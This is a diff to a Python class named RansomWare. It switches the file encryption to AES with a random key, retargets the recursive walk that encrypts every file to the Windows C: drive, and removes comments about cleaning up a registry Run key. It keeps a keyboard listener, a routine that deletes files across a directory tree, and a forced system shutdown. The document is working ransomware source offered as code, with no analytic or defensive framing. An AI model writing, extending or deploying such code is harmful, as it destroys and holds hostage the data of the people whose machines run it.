@@ -3,12 +3,14 @@ import time
 import threading
 from cryptography.fernet import Fernet
 from pynput import keyboard
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 
 class RansomWare:
     
     def __init__(self):
-        self.key = Fernet.generate_key()
-        self.crypter = Fernet(self.key)
+        self.key = get_random_bytes(16)
+        self.crypter = AES.new(self.key, AES.MODE_EAX)
         self.is_running = True
         self.keyboard_listener()
         self.encrypt_all_files()
@@ -16,7 +18,7 @@ class RansomWare:
         self.is_running = False
 
     def encrypt_all_files(self):
-        for root, dirs, files in os.walk('/'):
+        for root, dirs, files in os.walk('C:\\'):
             for file in files:
                 file_path = os.path.join(root, file)
                 self.encrypt_file(file_path)
@@ -62,7 +64,6 @@ class RansomWare:
             print(f"Error in keyboard listener: {e}")
 
     def uninstall(self):
-        # Uninstall the ransomware
         try:
             # Delete all files created by the ransomware
             for i in range(500):
@@ -78,14 +79,6 @@ class RansomWare:
                 for file in files:
                     file_path = os.path.join(root, file)
                     os.remove(file_path)
-            
-            # Delete the registry key that the ransomware added
-            # (This part is platform-specific and requires admin privileges)
-            # You can use the `winreg` module to access the Windows registry
-            # import winreg
-            # key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
-            # winreg.DeleteValue(key, "Ransomware")
-            # key.Close()
             
             # Terminate the script
             os.system("shutdown /s /t 0")
